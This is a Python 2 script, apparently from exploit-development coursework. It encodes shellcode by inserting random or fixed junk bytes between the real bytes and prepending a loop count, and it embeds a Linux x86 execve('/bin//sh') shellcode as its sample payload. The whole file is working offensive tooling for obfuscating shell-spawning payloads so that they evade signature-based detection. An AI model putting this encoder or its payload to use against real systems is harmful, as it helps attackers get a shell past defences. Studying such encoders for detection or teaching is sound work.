#!/usr/bin/python
"""
Author: Mutti K
Purpose: Proof of Concept Python Insertion Encoder.
Paste your shellcode into the script and an encoded shellcode will be printed to the console.
Limitations: Original shellcode cannot be larger than 255 bytes.

"""

import random
import sys

settings = {'debug':0,'timeout':5,'retry':5}
shellcode = ("\x31\xc0\x89\xc2\x89\xc1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")

def main(argv):
	shellcode_len = len(bytearray(shellcode))
	if shellcode_len > 255:
		print ("Shellcode is %d which is to big, cannot be bigger than 255 bytes" % shellcode_len)
	else:
		insertion_single_random()
	
'''
Format of output shellcode
[number of inserted bytes][shellcode byte][inserted byte]...
Limitation: Input shellcode cannot be greater than 255 bytes
Decoding: Read first byte from encoded shellcode and this will tell you how many iteration to remove fake byte
'''
def insertion_single_random():
	encoded = ""
	loop_count = 0
	print 'Single random insertion encoded shellcode ...'
	shellcode_len = len(bytearray(shellcode))
	
	for x in bytearray(shellcode) :
		INSERT_BYTE =  '0x%02x' % random.randint(1,255)
		if settings['debug']:
			print INSERT_BYTE

		loop_count += 1
		#Append real byte from shellcode
		encoded += '0x'
		encoded += '%02x,' %x
		#Append fake byte
		encoded += INSERT_BYTE
		
		if loop_count < shellcode_len:
			encoded += ','

	#Prepend loop count to final encoded shellcode
	encoded = '0x%02x,' %loop_count + encoded 

	print encoded

	print 'Len: %d' % shellcode_len
	print ("Loop rounds = %d" % loop_count)

def insertion_single():
	INSERT_BYTE = 0xAA

	encoded = ""
	encoded2 = ""
	loop_count = 0
	print 'Single insertion encoded shellcode ...'

	for x in bytearray(shellcode) :
		encoded += '\\x'
		encoded += '%02x' % x
		encoded += '\\x%02x' % INSERT_BYTE

		encoded2 += '0x'
		encoded2 += '%02x,' %x
		encoded2 += '0x%02x,' % INSERT_BYTE

	#print encoded

	print encoded2

	print 'Len: %d' % len(bytearray(shellcode))
	
if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except Exception as e:
        print 'Cannot run program.\n', e
        if (settings['debug'] is not None):
            raise
